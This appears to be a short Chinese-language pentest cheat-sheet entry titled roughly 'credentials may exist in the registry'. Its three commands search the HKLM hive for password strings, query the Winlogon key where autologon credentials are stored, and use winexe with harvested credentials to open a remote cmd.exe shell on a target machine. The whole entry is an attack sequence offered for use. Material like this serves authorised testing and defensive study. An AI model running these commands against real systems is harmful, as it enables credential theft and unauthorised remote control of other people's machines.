# （可尝试）注册表存在凭据

```bash

reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
登陆
winexe -U 'admin%password' //MACHINE_IP cmd.exe

```

‍
